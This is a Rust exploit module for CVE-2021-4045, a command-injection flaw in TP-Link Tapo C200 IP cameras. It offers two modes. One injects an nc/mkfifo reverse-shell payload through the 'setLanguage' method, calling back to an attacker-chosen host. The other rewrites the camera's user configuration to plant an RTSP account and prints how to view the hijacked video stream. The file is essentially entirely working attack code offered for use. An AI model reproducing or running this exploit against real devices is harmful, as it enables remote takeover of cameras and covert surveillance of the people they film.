use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use serde_json::json;
use crate::utils::{prompt_required, prompt_default, normalize_target};
use std::time::Duration;

/// TP-Link Tapo C200 IP Camera Command Injection (CVE-2021-4045)
/// 
/// Exploits a command injection vulnerability in the `setLanguage` method
/// to achieve RCE or takeover the RTSP stream.

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP")?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    
    let url = format!("https://{}:443/", target_ip);
    println!("{} Target URL: {}", "[*]".blue(), url);

    // Initial check
    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;

    // Select mode
    println!("\nSelect Exploit Mode:");
    println!("1. Reverse Shell (RCE)");
    println!("2. RTSP Stream Takeover");
    let mode = prompt_default("Selection", "1")?;

    match mode.as_str() {
        "1" => exploit_shell(&client, &url, &target_ip).await?,
        "2" => exploit_rtsp(&client, &url, &target_ip).await?,
        _ => println!("{} Invalid selection", "[!]".red()),
    }

    Ok(())
}

async fn exploit_shell(client: &Client, url: &str, target_ip: &str) -> Result<()> {
    println!("\n{}", "=== Reverse Shell Mode ===".cyan().bold());
    
    let attacker_ip = prompt_required("Attacker IP (LHOST)")?;
    let port_str = prompt_default("Attacker Port (LPORT)", "1337")?;
    let port: u16 = port_str.parse().context("Invalid port number")?;

    println!("{} Preparing payload...", "[*]".blue());
    println!("{} Please ensure you have a listener running: {} {}", "[!]".yellow(), "nc -lvnp", port);
    
    let _ = prompt_default("Press ENTER when listener is ready...", "");

    // Payload construction
    // rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc %s %d >/tmp/f
    let reverse_shell = format!(
        "rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {} {} >/tmp/f",
        attacker_ip, port
    );
    
    let payload = format!("';{};'", reverse_shell);
    
    let json_body = json!({
        "method": "setLanguage",
        "params": {
            "payload": payload
        }
    });

    println!("{} Sending malicious request to {}...", "[*]".blue(), target_ip);
    
    // We expect a timeout or disconnect if the shell works efficiently, 
    // or just a response. We'll send it and not strictly check success 
    // because the camera server might hang or crash.
    let res = client.post(url)
        .json(&json_body)
        .send()
        .await;

    match res {
        Ok(r) => {
             // If we get a response, print status. 
             // Note: success in RCE often means NO response or a timeout.
             println!("{} Request sent. Status: {}", "[+]".green(), r.status());
        },
        Err(e) => {
            println!("{} Request sent (Error: {}). If the shell spawned, this is normal.", "[*]".yellow(), e);
        }
    }

    println!("\n{} Check your listener!", "[+]".green().bold());
    Ok(())
}

async fn exploit_rtsp(client: &Client, url: &str, target_ip: &str) -> Result<()> {
    println!("\n{}", "=== RTSP Takeover Mode ===".cyan().bold());
    
    let rtsp_user = prompt_default("New RTSP Username", "pwned1337")?;
    let rtsp_pass = prompt_default("New RTSP Password", "pwned1337")?;
    
    // Calculate MD5 of password as required by the device
    // python: hashlib.md5(RTSP_PASSWORD.encode()).hexdigest().upper()
    let md5_pass = format!("{:x}", md5::compute(rtsp_pass.as_bytes())).to_uppercase();
    
    // Default ciphertext from PoC (appears to be static/compatible)
    let ciphertext = "RUW5pUYSBm4gt+5T7bzwEq5r078rcdhSvpJrmtqAKE2mRo8bvvOLfYGnr5GNHfANBeFNEHhucnsK86WJTs4xLEZMbxUS73gPMTYRsEBV4EaKt2f5h+BkSbuh0WcJTHl5FWMbwikslj6qwTX48HasSiEmotK+v1N3NLokHCxtU0k=";

    // UCI commands
    let cmd_chain = format!(
        "uci set user_management.third_account.username={};uci set user_management.third_account.passwd={};uci set user_management.third_account.ciphertext={};uci commit user_management;/etc/init.d/cet terminate;/etc/init.d/cet resume;",
        rtsp_user, md5_pass, ciphertext
    );

    let payload = format!("';{}'", cmd_chain);
    
    let json_body = json!({
        "method": "setLanguage",
        "params": {
            "payload": payload
        }
    });

    println!("{} Injecting RTSP configuration...", "[*]".blue());
    
    let res = client.post(url)
        .json(&json_body)
        .send()
        .await
        .context("Failed to send exploit request")?;
        
    if res.status().is_success() {
        println!("{} Exploit executed successfully!", "[+]".green().bold());
        println!("------------------------------------------------");
        println!("RTSP Stream: rtsp://{}/stream2", target_ip);
        println!("Username:    {}", rtsp_user);
        println!("Password:    {}", rtsp_pass);
        println!("------------------------------------------------");
        println!("{} You can verify with: ffplay rtsp://{}:{}@{}/stream2", "[*]".blue(), rtsp_user, rtsp_pass, target_ip);
    } else {
        println!("{} Unexpected response: {}", "[-]".red(), res.status());
    }

    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    TP-Link Tapo C200 Command Injection (CVE-2021-4045)    ║".cyan());
    println!("{}", "║    Modes: Reverse Shell / RTSP Stream Account Takeover    ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
